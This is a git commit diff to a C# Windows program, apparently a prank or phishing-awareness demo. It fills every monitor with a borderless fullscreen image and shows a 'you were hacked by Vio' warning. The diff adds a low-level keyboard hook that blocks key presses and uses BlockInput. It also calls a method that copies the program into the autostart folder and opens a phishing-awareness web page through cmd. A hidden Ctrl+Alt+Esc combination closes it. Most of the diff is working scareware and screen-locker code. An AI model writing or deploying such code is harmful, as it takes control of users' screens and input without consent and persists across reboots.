b9bf01883fbfa40d9b8ad071ee125cb7c367ef4b
viorelghiurca <ghiurca.viorel@icloud.com>
2024-10-29 15:21:10 +0100

    Add files via upload

--- FulscreenApp/Form1.Designer.cs
+++ FulscreenApp/Form1.Designer.cs
@@ -1,15 +1,31 @@
-﻿namespace FullscreenApp {
+﻿using System.Windows.Forms;
+
+namespace FullscreenApp {
     partial class Form1 {
         private void InitializeComponent() {
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
             this.SuspendLayout();
             // 
             // Form1
             // 
             this.BackgroundImage = global::FulscreenApp.Properties.Resources._3296364;
-            this.ClientSize = new System.Drawing.Size(800, 450);
+            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
+            this.ClientSize = new System.Drawing.Size(1920, 1080);
+            this.ControlBox = false;
+            this.Cursor = System.Windows.Forms.Cursors.No;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
             this.Name = "Form1";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
             this.ResumeLayout(false);
-
+            MessageBox.Show("Du würdest von Vio gehackt", "Achtung", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
+
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
     }
 }
--- FulscreenApp/Form1.cs
+++ FulscreenApp/Form1.cs
@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.Drawing; // Für Image-Unterstützung
 using System.IO;
 using System.Runtime.InteropServices;
@@ -10,18 +11,41 @@ namespace FullscreenApp {
         [DllImport("user32.dll")]
         private static extern bool BlockInput(bool fBlockIt);
 
-        public Form1() {
-            InitializeComponent(); // Vom Designer generiert
-            ShowImageInFullscreen(); // Methode für Vollbild und Bildanzeige
-            CopyToStartup(); // Methode zum Kopieren in den Autostart-Ordner
-        }
+        // Hook-Parameter
+        private const int WH_KEYBOARD_LL = 13;
+        private LowLevelKeyboardProc _proc;
+        private IntPtr _hookID = IntPtr.Zero;
 
-        private void ShowImageInFullscreen() {
-            // Fenster maximieren und Bild anzeigen
-            this.BackgroundImage = global::FulscreenApp.Properties.Resources._3296364;
-            this.FormBorderStyle = FormBorderStyle.None;
-            this.WindowState = FormWindowState.Maximized;
-            this.BackgroundImageLayout = ImageLayout.Stretch;
+        string url = "https://support.beko-monheim.de/articles/JSD-A-58/Phishing"; // Ersetze dies durch deinen gewünschten Link
+
+        public Form1() {              
+            ShowImageOnAllScreens();
+            CopyToStartup(); // Methode zum Kopieren in den Autostart-Ordner
+            InitializeComponent(); // Vom Designer generiert
+            MessageBox.Show("Du würdest von Vio gehackt", "Achtung", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            Process.Start(new ProcessStartInfo("cmd", $"/c start {url}") { CreateNoWindow = true });
+        }
+        private void ShowImageOnAllScreens() {
+            // Für jeden Bildschirm ein neues Fenster erstellen
+            foreach (Screen screen in Screen.AllScreens) {               
+                Form fullscreenForm = new Form {
+                    BackgroundImage = FulscreenApp.Properties.Resources._3296364,
+                    FormBorderStyle = FormBorderStyle.None,
+                    WindowState = FormWindowState.Maximized,
+                    BackgroundImageLayout = ImageLayout.Stretch,
+                    StartPosition = FormStartPosition.Manual,
+                    Location = screen.Bounds.Location, // Position des neuen Fensters auf dem Bildschirm
+                    Size = screen.Bounds.Size, // Größe des Fensters entsprechend der Bildschirmgröße
+                    ControlBox = false,
+                    Cursor = System.Windows.Forms.Cursors.No,
+                    MaximizeBox = false,
+                    MinimizeBox = false,
+                    ShowIcon = false,
+                    ShowInTaskbar = false,
+                    SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide                 
+                };                
+                fullscreenForm.Show();              
+            }
         }
 
         private void CopyToStartup() {
@@ -44,6 +68,49 @@ namespace FullscreenApp {
         protected override void OnFormClosed(FormClosedEventArgs e) {
             BlockInput(false); // Eingabegeräte entsperren
             base.OnFormClosed(e);
+        }
+
+        // Global Keyboard Hook
+        private IntPtr SetHook(LowLevelKeyboardProc proc) {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule) {
+                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
+                    GetModuleHandle(curModule.ModuleName), 0);
+            }
+        }
+
+        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            return (IntPtr)1; // Block the key press
+        }
+
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        private void CloseAllForms() {
+            foreach (var form in Application.OpenForms) {
+                if (form is Form fullscreenForm) {
+                    MessageBox.Show("Du würdest von Vio gehackt", "Achtung", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    fullscreenForm.Close();
+                }
+            }
+        }
+
+        //Ctrl + Alt + Esc Schliesst alles und rettet der Tag
+        protected override bool ProcessCmdKey(ref Message msg, Keys keyData) {
+            if (keyData == (Keys.Control | Keys.Alt | Keys.Escape)) {
+                BlockInput(false);
+                CloseAllForms();
+            }
+            return base.ProcessCmdKey(ref msg, keyData);
         }
     }
 }
